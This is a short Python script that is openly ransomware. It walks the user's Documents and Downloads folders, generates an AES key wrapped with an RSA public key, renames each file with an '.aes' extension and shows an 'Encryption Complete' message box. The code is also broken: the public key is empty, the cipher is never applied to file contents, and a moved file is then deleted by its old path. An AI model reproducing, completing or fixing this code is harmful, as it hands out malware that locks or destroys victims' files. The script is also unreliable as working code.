import os
import shutil
import secrets
import subprocess
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import tkinter as tk
from tkinter import messagebox
from pathlib import Path
import requests
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from pyAesCrypt import encryptFile

#linux n mac
folders_path = [
    str(os.path.join(Path.home(), "Documents")),
    str(os.path.join(Path.home(), "Downloads"))
]

file_key = secrets.token_bytes(32)
iv = os.urandom(16)

public_key_bytes = "" # RSA public key
rsa_public_key = load_pem_public_key(public_key_bytes)

encrypted_file_key = rsa_public_key.encrypt(
    file_key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)


for folder in folders_path:
    for file in os.listdir(folder):
        bufferSize = 128*1024
        filePath = os.path.join(folder, file)
        if not file.endswith(".aes"):
            cipher = Cipher(algorithms.AES(file_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()

            destination_path= os.path.join(folder , file+".aes")
            shutil.move(filePath,destination_path)
            os.remove(filePath)

root = tk.Tk()
root.withdraw()
root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
messagebox.showinfo("Encryption Complete", "All files in the folders have been encrypted. ")
root.mainloop()
